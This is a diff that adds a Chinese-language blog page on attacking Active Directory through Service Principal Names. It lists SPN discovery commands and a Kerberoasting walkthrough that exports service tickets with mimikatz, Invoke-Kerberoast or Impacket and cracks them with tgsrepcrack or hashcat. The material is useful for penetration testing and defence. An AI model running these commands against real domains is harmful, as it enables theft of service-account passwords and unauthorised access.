@@ -1,0 +1,315 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="Keywords" content="blog"/>
+    <meta name="Description" content="blog"/>
+    <title>Simple</title>
+    <link rel="shortcut icon" href="/static/favicon.png"/>
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+</head>
+<body>
+<div class="main">
+    <div class="header">
+    	<ul id="pages">
+            <li><a href="/">home</a></li>
+            <li><a href="/#/tags">tags</a></li>
+            <li><a href="/#/archive">archive</a></li>
+    	</ul>
+    </div>
+	<div class="wrap-header">
+    <h1>
+    <a href="/" id="title"></a>
+    </h1>
+	</div>
+<xmp id="md" style="display: none;">
+<!-- markdown -->
+## 介绍
+
+SPN 全称 Service Principal name, 即服务主体名称. 将服务实例和服务账户与 Kerberos 协议相关联. 简单来说, SPN 使得域内的服务(例如 MSSQL Exchange FTP CIFS)在进行身份认证时都能采用 Kerberos 协议.
+
+## 信息收集
+
+因为通常一部分服务会在域中注册 SPN, 而域中的所有用户都有权限查看 SPN 信息, 所以我们就可以利用 SPN 来达到无须端口探测以进行信息收集的目的.
+
+常用 SPN 对应的服务 [ADSecurity](https://adsecurity.org/?page_id=183).
+
+几种查询 SPN 信息的方式.
+
+### setspn
+
+```
+setspn -Q */* // 查看所有 SPN
+setspn -Q */DC // 查看 DC 主机的 SPN
+```
+
+### Powershell-AD-Recon
+
+MSSQL.
+
+```
+Import-Module .\Discover-PSMSSQLServers.ps1
+Discover-PSMSSQLServers
+```
+Exchange.
+
+```
+Import-Module .\Discover-PSMSExchangeServers.ps1
+Discover-PSMSExchangeServers
+```
+
+HTTP FTP TERMSRV DNS... 
+
+```
+Import-Module .\Discover-PSInterestingServices.ps1
+Discover-PSInterestingServices
+```
+
+按账户查看 SPN.
+
+```
+Import-Module .\Find-PSServiceAccounts.ps1
+Find-PSServiceAccounts
+```
+
+### Kerberoast
+
+```
+cscript GetUserSPNs.vbs
+```
+
+`GetUserSPNs.ps1` 本地测试失败.
+
+
+## 凭据爆破
+
+当 Kerberos 凭据为 RC4\_HMAC\_MD5 加密时, 可通过 Kerberoast 或 Hashcat 进行凭据爆破.
+
+域内机器为 2003 及以下时, 默认采用 RC4\_HMAC\_MD5 方式加密 Kerberos 凭据, 2008 R2 及以上系统需在组策略中手动更改(默认为 AES 加密).
+
+先导出从 KDC 申请的 TGS Ticket. 然后再进行爆破. 这里有三种方法.
+
+### mimikatz
+
+```
+kerberos::purge
+kerberos::ask /target:MSSQLSvc/DC.test.com:1433
+kerberos::list /export
+```
+
+### Invoke-Kerberoast
+
+作者原本的 ps 脚本有错误. 要使用 Empire 中的版本.
+
+```
+Import-Module .\Invoke-Kerberoast.ps1
+Invoke-Kerberoast.ps1 -OutputFormat hashcat | fl
+```
+
+需手动复制并去除换行符.
+
+### Impacket
+
+可以在非域主机上导出 Hashcat 格式的密文. 需要域内用户的凭据.
+
+```
+GetUserSPNs.py -request -dc-ip 192.168.1.100 test.com/user
+Password: ******* // Input password for user
+```
+
+导出后可通过 Kerberos 自带的工具或 JohnTheRipper, Hashcat 爆破.
+
+### Kerberoast
+
+```
+tgsrepcrack.py passwords.txt mssql.kirbi
+```
+
+### Hashcat
+
+```
+hashcat -m 13100 hash.txt passwords.txt
+```
+
+### 后续利用
+
+Kerberoast 中的 `kerberoast.py` 可通过爆破得出的密码解密 Ticket, 不过在实际测试中一直失败(具体可看 [kerberoast issue](https://github.com/nidem/kerberoast/issues/11)).
+
+个人认为可通过明文密码加上服务账户的用户名直接登录到对应的服务器(如 MSSQL Exchange FTP WEB CIFS), 也能使用 mimikatz 申请对应的 TGS Ticket 来访问服务, 不过暂未做具体测试.
+<!-- markdown end -->
+</xmp>
+<div class="entry" id="main">
+<!-- content -->
+<h2 id="">介绍</h2>
+
+<p>SPN 全称 Service Principal name, 即服务主体名称. 将服务实例和服务账户与 Kerberos 协议相关联. 简单来说, SPN 使得域内的服务(例如 MSSQL Exchange FTP CIFS)在进行身份认证时都能采用 Kerberos 协议.</p>
+
+<h2 id="">信息收集</h2>
+
+<p>因为通常一部分服务会在域中注册 SPN, 而域中的所有用户都有权限查看 SPN 信息, 所以我们就可以利用 SPN 来达到无须端口探测以进行信息收集的目的.</p>
+
+<p>常用 SPN 对应的服务 <a href="https://adsecurity.org/?page_id=183">ADSecurity</a>.</p>
+
+<p>几种查询 SPN 信息的方式.</p>
+
+<h3 id="setspn">setspn</h3>
+
+<pre><code>setspn -Q */* // 查看所有 SPN
+setspn -Q */DC // 查看 DC 主机的 SPN
+</code></pre>
+
+<h3 id="powershelladrecon">Powershell-AD-Recon</h3>
+
+<p>MSSQL.</p>
+
+<pre><code>Import-Module .\Discover-PSMSSQLServers.ps1
+Discover-PSMSSQLServers
+</code></pre>
+
+<p>Exchange.</p>
+
+<pre><code>Import-Module .\Discover-PSMSExchangeServers.ps1
+Discover-PSMSExchangeServers
+</code></pre>
+
+<p>HTTP FTP TERMSRV DNS... </p>
+
+<pre><code>Import-Module .\Discover-PSInterestingServices.ps1
+Discover-PSInterestingServices
+</code></pre>
+
+<p>按账户查看 SPN.</p>
+
+<pre><code>Import-Module .\Find-PSServiceAccounts.ps1
+Find-PSServiceAccounts
+</code></pre>
+
+<h3 id="kerberoast">Kerberoast</h3>
+
+<pre><code>cscript GetUserSPNs.vbs
+</code></pre>
+
+<p><code>GetUserSPNs.ps1</code> 本地测试失败.</p>
+
+<h2 id="">凭据爆破</h2>
+
+<p>当 Kerberos 凭据为 RC4_HMAC_MD5 加密时, 可通过 Kerberoast 或 Hashcat 进行凭据爆破.</p>
+
+<p>域内机器为 2003 及以下时, 默认采用 RC4_HMAC_MD5 方式加密 Kerberos 凭据, 2008 R2 及以上系统需在组策略中手动更改(默认为 AES 加密).</p>
+
+<p>先导出从 KDC 申请的 TGS Ticket. 然后再进行爆破. 这里有三种方法.</p>
+
+<h3 id="mimikatz">mimikatz</h3>
+
+<pre><code>kerberos::purge
+kerberos::ask /target:MSSQLSvc/DC.test.com:1433
+kerberos::list /export
+</code></pre>
+
+<h3 id="invokekerberoast">Invoke-Kerberoast</h3>
+
+<p>作者原本的 ps 脚本有错误. 要使用 Empire 中的版本.</p>
+
+<pre><code>Import-Module .\Invoke-Kerberoast.ps1
+Invoke-Kerberoast.ps1 -OutputFormat hashcat | fl
+</code></pre>
+
+<p>需手动复制并去除换行符.</p>
+
+<h3 id="impacket">Impacket</h3>
+
+<p>可以在非域主机上导出 Hashcat 格式的密文. 需要域内用户的凭据.</p>
+
+<pre><code>GetUserSPNs.py -request -dc-ip 192.168.1.100 test.com/user
+Password: ******* // Input password for user
+</code></pre>
+
+<p>导出后可通过 Kerberos 自带的工具或 JohnTheRipper, Hashcat 爆破.</p>
+
+<h3 id="kerberoast">Kerberoast</h3>
+
+<pre><code>tgsrepcrack.py passwords.txt mssql.kirbi
+</code></pre>
+
+<h3 id="hashcat">Hashcat</h3>
+
+<pre><code>hashcat -m 13100 hash.txt passwords.txt
+</code></pre>
+
+<h3 id="">后续利用</h3>
+
+<p>Kerberoast 中的 <code>kerberoast.py</code> 可通过爆破得出的密码解密 Ticket, 不过在实际测试中一直失败(具体可看 <a href="https://github.com/nidem/kerberoast/issues/11">kerberoast issue</a>).</p>
+
+<p>个人认为可通过明文密码加上服务账户的用户名直接登录到对应的服务器(如 MSSQL Exchange FTP WEB CIFS), 也能使用 mimikatz 申请对应的 TGS Ticket 来访问服务, 不过暂未做具体测试.</p>
+<!-- content end -->
+</div>
+<br>
+<br>
+    <div id="disqus_thread"></div>
+	<div class="footer">
+		<p>© Copyright 2017-2019 by X1r0z</p>
+	</div>
+</div>
+<script src="main.js"></script>
+<script id="content" type="text/mustache">
+    <h1>{{title}}</h1>
+    <div class="tag">
+    {{date}}
+    {{#tags}}
+    <a href="/#/tag/{{name}}">#{{name}}</a>
+    {{/tags}}
+    </div>
+</script>
+<script id="pagesTemplate" type="text/mustache">
+    {{#pages}}
+    <li>
+        <a href="{{path}}">{{title}}</a>
+    </li>
+    {{/pages}}
+</script>
+<script>
+$(document).ready(function() {
+    $.ajax({
+        url: "main.json",
+        type: "GET",
+        dataType: "json",
+        success: function(data) {
+            $("#title").html(data.name);
+            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
+            var pagesHtml = pagesTemplate.render({"pages": data.pages});
+            $("#pages").append(pagesHtml);
+            //path
+            var path = "spn-attack-in-active-directory.html";
+            //path end
+            var now = 0;
+            for (var i = 0; i < data.posts.length; ++i)
+                if (path == data.posts[i].path)
+                    now = i;
+            var post = data.posts[now];
+            var tmp = post.tags.split(" ");
+            var tags = [];
+            for (var i = 0; i < tmp.length; ++i)
+                if (tmp[i].length > 0)
+                    tags.push({"name": tmp[i]});
+            var contentTemplate = Hogan.compile($("#content").html());
+            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
+            $("#main").prepend(contentHtml);
+            if (data.disqus_shortname.length > 0) {
+                var disqus_shortname = data.disqus_shortname;
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            }
+        }
+    });
+});
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
+</script>
+</body>
+</html>
